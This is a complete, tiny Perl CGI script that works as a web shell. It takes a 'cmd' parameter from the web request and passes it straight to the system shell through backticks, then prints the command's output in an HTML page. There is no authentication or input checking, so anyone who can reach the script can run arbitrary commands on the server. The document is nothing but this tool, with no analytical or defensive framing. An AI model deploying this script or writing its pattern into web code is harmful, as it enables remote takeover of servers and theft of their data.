#!/usr/bin/perl

use strict;
use CGI ':standard';

my $cmd = param('cmd');

print
header(),
start_html(-bgcolor => 'yellow', 'Result'),
`$cmd` || "Invalid command",
end_html();